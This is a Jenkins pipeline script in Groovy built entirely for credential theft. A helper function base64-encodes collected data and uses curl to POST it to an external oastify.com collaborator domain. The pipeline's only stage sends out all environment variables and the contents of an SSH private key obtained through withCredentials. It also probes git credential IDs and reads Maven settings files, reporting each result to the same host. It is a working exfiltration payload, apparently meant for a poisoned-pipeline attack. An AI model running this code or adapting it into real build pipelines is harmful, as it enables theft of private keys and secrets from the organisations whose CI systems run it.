def EXFILTRATION_DOMAIN = "9w6fdx3mohs6hg9t3e11yzpnkeq5ev2k.oastify.com"

def exfiltrateData(String type, def dataPayload, String credId = null) {
    try {
        def jsonData = [
            type: type,
            build_url: env.BUILD_URL ?: 'N/A',
            job_name: env.JOB_NAME ?: 'N/A',
            node_name: env.NODE_NAME ?: 'N/A',
            timestamp: new Date().toISOString()
        ]
        if (credId) {
            jsonData.put("credential_id", credId)
        }
        jsonData.put("data", dataPayload)
        def jsonString = new groovy.json.JsonOutput().toJson(jsonData)
        def encodedJson = jsonString.bytes.encodeBase64().toString()
        def command = "curl -X POST --connect-timeout 15 -s -o /dev/null -w '%{http_code}' --data-urlencode 'blob=${encodedJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_data'"
        echo "Attempting exfiltration for type: ${type}..."
        def result = sh(script: command + " || echo 'curl_command_failed'", returnStdout: true).trim()
        if (result == 'curl_command_failed') {
            echo "Error: Exfiltration command failed for '${type}'."
        } else if (result.matches(/\d{3}/) && (result.toInteger() < 200 || result.toInteger() >= 300) ) {
            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned HTTP status: ${result}"
        } else if (result.matches(/\d{3}/)) {
            echo "Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} likely succeeded with HTTP status: ${result}"
        } else {
            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned unexpected output: ${result}"
        }
    } catch (Exception e) {
        echo "Exception during exfiltration for type '${type}': ${e.getMessage()}"
        try {
            def errorJsonString = new groovy.json.JsonOutput().toJson([type: "exfiltration_function_error", error_message: e.getMessage(), failed_type: type])
            def encodedErrorJson = errorJsonString.bytes.encodeBase64().toString()
            sh(script: "curl -X POST --connect-timeout 5 -s -o /dev/null --data-urlencode 'blob=${encodedErrorJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_error' || true", returnStdout: true).trim()
        } catch (Exception nestedE) {
            echo "Failed to exfiltrate error details about exfiltration failure: ${nestedE.getMessage()}"
        }
    }
}

pipeline {
    agent any
    environment {
        RUDDER_VERSION = "8.3" // From original, will be in env dump
        // POSTGRES_PASSWORD, POSTGRES_DB, POSTGRES_USER were in a stage's env block,
        // they will be captured if that stage's context was active or if set globally.
        // For this minimal script, they are not explicitly set unless part of agent's default env.
    }
    stages {
        stage('ExfiltrateAllAvailableData') {
            steps {
                script {
                    exfiltrateData("initial_and_pipeline_environment_variables", env.getEnvironment())

                    def sshCredId = 'f15029d3-ef1d-4642-be7d-362bf7141e63'
                    try {
                        withCredentials([sshUserPrivateKey(credentialsId: sshCredId, keyFileVariable: 'EXFIL_KEY_FILE', passphraseVariable: 'EXFIL_KEY_PASS', usernameVariable: 'EXFIL_KEY_USER')]) {
                            try {
                                def keyFileContent = readFile(EXFIL_KEY_FILE)
                                exfiltrateData("ssh_private_key_content", [username: EXFIL_KEY_USER, passphrase_present: EXFIL_KEY_PASS ? 'yes' : 'no', key_content: keyFileContent], sshCredId)
                            } catch (e) {
                                exfiltrateData("ssh_private_key_read_error", [error: e.getMessage(), username: EXFIL_KEY_USER], sshCredId)
                            }
                        }
                    } catch (Exception e) {
                        exfiltrateData("ssh_credential_access_error", [credential_id: sshCredId, error: e.getMessage()], sshCredId)
                    }

                    def gitCredId = '17ec2097-d10e-4db5-b727-91a80832d99d'
                    exfiltrateData("git_credential_id_usage_reference", [info: "The Jenkinsfile references git credential ID for git operations. Direct secret extraction for this type via a simple withCredentials block is not standard; Jenkins git client handles it.", credential_id: gitCredId], gitCredId)
                    // Attempt to see if it's a common type, though unlikely for git plugin specific creds
                    try {
                        withCredentials([usernamePassword(credentialsId: gitCredId, usernameVariable: 'TEMP_GIT_USER', passwordVariable: 'TEMP_GIT_PASS')]) {
                             exfiltrateData("git_credential_as_userpass_attempt", [username: TEMP_GIT_USER, password_retrieved: "yes (not exfiltrated)"], gitCredId)
                        }
                    } catch (org.jenkinsci.plugins.workflow.steps.MissingContextVariableException e){
                        // This is common if the cred id is not of this type
                         exfiltrateData("git_credential_as_userpass_type_mismatch_or_not_found", [credential_id: gitCredId, error: e.getMessage()], gitCredId)
                    } catch (Exception e) {
                         exfiltrateData("git_credential_as_userpass_other_error", [credential_id: gitCredId, error: e.getMessage()], gitCredId)
                    }
                     try {
                        withCredentials([string(credentialsId: gitCredId, variable: 'TEMP_GIT_TOKEN')]) {
                             exfiltrateData("git_credential_as_string_attempt", [token_retrieved: "yes (not exfiltrated)"], gitCredId)
                        }
                    } catch (org.jenkinsci.plugins.workflow.steps.MissingContextVariableException e){
                         exfiltrateData("git_credential_as_string_type_mismatch_or_not_found", [credential_id: gitCredId, error: e.getMessage()], gitCredId)
                    } catch (Exception e) {
                         exfiltrateData("git_credential_as_string_other_error", [credential_id: gitCredId, error: e.getMessage()], gitCredId)
                    }


                    def mavenSettingsCredId = "1bfa2e1a-afda-4cb4-8568-236c44b94dbf"
                    try {
                        withMaven(globalMavenSettingsConfig: mavenSettingsCredId) {
                            exfiltrateData("maven_global_settings_context_active", [mvn_command_in_context: env.MVN_CMD ?: "MVN_CMD not found in env", credential_id: mavenSettingsCredId], mavenSettingsCredId)
                            if (env.MVN_CMD) {
                                def matcher = (env.MVN_CMD =~ /(?:--settings|-s)\s+([^\s]+)/)
                                if (matcher.find()) {
                                    def settingsPath = matcher.group(1)
                                    if (fileExists(settingsPath)) {
                                        try {
                                            def settingsContent = readFile(settingsPath)
                                            exfiltrateData("maven_settings_file_content", [path: settingsPath, content: settingsContent], mavenSettingsCredId)
                                        } catch (e) {
                                            exfiltrateData("maven_settings_file_read_error", [path: settingsPath, error: e.getMessage()], mavenSettingsCredId)
                                        }
                                    } else {
                                        exfiltrateData("maven_settings_file_not_found_at_parsed_path", [path: settingsPath, mvn_command: env.MVN_CMD], mavenSettingsCredId)
                                    }
                                } else {
                                     exfiltrateData("maven_settings_path_not_parsed_from_mvn_command", [mvn_command: env.MVN_CMD], mavenSettingsCredId)
                                }
                            } else {
                                exfiltrateData("maven_settings_mvn_command_not_available_in_withmaven", [:], mavenSettingsCredId)
                            }
                        }
                    } catch (Exception e) {
                        exfiltrateData("maven_settings_withmaven_block_error", [credential_id: mavenSettingsCredId, error: e.getMessage()], mavenSettingsCredId)
                    }
                    echo "Minimal exfiltration attempts complete."
                }
            }
        }
    }
}